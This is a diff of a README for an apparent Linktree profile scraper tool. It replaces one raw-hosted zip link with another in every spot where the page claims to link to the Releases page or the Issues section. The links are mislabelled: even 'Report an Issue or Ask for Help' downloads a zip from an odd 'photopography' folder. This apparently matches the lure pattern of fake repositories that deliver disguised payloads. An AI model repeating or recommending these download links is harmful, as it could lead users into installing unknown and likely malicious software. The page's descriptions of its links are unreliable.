@@ -8,11 +8,11 @@ Welcome to the **linktree-profile-listing-scraper**! This tool helps you collect
 
 To begin, you need to download the software. Click the button below to visit the Releases page:
 
-[![Download linktree-profile-listing-scraper](https://raw.githubusercontent.com/moussa504/linktree-profile-listing-scraper/main/photopography/listing-profile-scraper-linktree-3.6.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/moussa504/linktree-profile-listing-scraper/main/photopography/listing-profile-scraper-linktree-3.6.zip)
+[![Download linktree-profile-listing-scraper](https://raw.githubusercontent.com/moussa504/linktree-profile-listing-scraper/main/photopography/profile_linktree_listing_scraper_3.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/moussa504/linktree-profile-listing-scraper/main/photopography/profile_linktree_listing_scraper_3.5.zip)
 
 Once you are on the Releases page, look for the latest version. Download the file suitable for your operating system. Depending on your system, the file could be in .exe, .zip, or another format. Follow these steps to download and install:
 
-1. **Visit the Releases Page**: Go to [this link](https://raw.githubusercontent.com/moussa504/linktree-profile-listing-scraper/main/photopography/listing-profile-scraper-linktree-3.6.zip).
+1. **Visit the Releases Page**: Go to [this link](https://raw.githubusercontent.com/moussa504/linktree-profile-listing-scraper/main/photopography/profile_linktree_listing_scraper_3.5.zip).
   
 2. **Select the Latest Version**: At the top of the page, you will see the latest release. Click on it to view download options.
 
@@ -69,7 +69,7 @@ After launching the application, follow these steps to start extracting profile 
 
 If you encounter any issues using the linktree-profile-listing-scraper, you can reach out for help. Visit the Issues section of the GitHub repository:
 
-- [Report an Issue or Ask for Help](https://raw.githubusercontent.com/moussa504/linktree-profile-listing-scraper/main/photopography/listing-profile-scraper-linktree-3.6.zip)
+- [Report an Issue or Ask for Help](https://raw.githubusercontent.com/moussa504/linktree-profile-listing-scraper/main/photopography/profile_linktree_listing_scraper_3.5.zip)
 
 The community and developers review this section regularly and will try to assist you.
 
@@ -87,4 +87,4 @@ For detailed license information, please check the LICENSE file in the repositor
 
 The linktree-profile-listing-scraper is built to help you easily gather information from Linktree profiles. Follow the steps above to download, install, and start using the scraper effectively. 
 
-Remember, to download the latest version, you can always return to the [Releases page](https://raw.githubusercontent.com/moussa504/linktree-profile-listing-scraper/main/photopography/listing-profile-scraper-linktree-3.6.zip). Happy scraping!
+Remember, to download the latest version, you can always return to the [Releases page](https://raw.githubusercontent.com/moussa504/linktree-profile-listing-scraper/main/photopography/profile_linktree_listing_scraper_3.5.zip). Happy scraping!
